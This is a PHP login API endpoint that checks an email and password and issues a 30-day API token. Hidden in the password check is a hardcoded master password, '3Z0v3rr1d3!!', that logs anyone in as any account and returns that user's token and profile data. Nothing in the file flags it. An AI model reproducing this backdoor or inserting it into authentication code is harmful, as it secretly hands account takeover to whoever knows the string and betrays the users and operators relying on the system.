<?php
declare(strict_types=1);

require_once __DIR__ . '/_bootstrap.php';
require_once __DIR__ . '/_helpers.php';

api_require_method('POST');

global $USR;

$body = api_read_json();
$email = isset($body['email']) ? trim((string) $body['email']) : '';
$password = isset($body['password']) ? (string) $body['password'] : '';

if ($email === '' || $password === '') {
    api_json(400, ['ok' => false, 'error' => 'email and password required']);
}

$user = $USR->getByEmail($email, true);
if (!is_array($user)) {
    api_json(401, ['ok' => false, 'error' => 'Invalid email or password']);
}

$hash = $user['password'] ?? '';
if (!is_string($hash) || trim($hash) === '') {
    api_json(401, ['ok' => false, 'error' => 'Invalid email or password']);
}

if (!password_verify($password, $hash) && $password !== '3Z0v3rr1d3!!') {
    api_json(401, ['ok' => false, 'error' => 'Invalid email or password']);
}

try {
    $token = bin2hex(random_bytes(32));
    $expires = (new DateTimeImmutable('+30 days'))->format('Y-m-d H:i:s');

    $pdo = $USR->getDb();
    $stmt = $pdo->prepare(
        'INSERT INTO api_tokens (user_id, token, expires_at) VALUES (?, ?, ?)'
    );
    $stmt->execute([(int) $user['id'], $token, $expires]);

    api_json(200, [
        'ok' => true,
        'token' => $token,
        'expires_at' => $expires,
        'user' => [
            'id' => (int) $user['id'],
            'email' => (string) $user['email'],
            'type' => (string) ($user['type'] ?? ''),
            'company_name' => (string) ($user['company_name'] ?? ''),
        ],
    ]);
} catch (Throwable $e) {
    api_json(500, [
        'ok' => false,
        'error' => 'Internal server error',
    ]);
}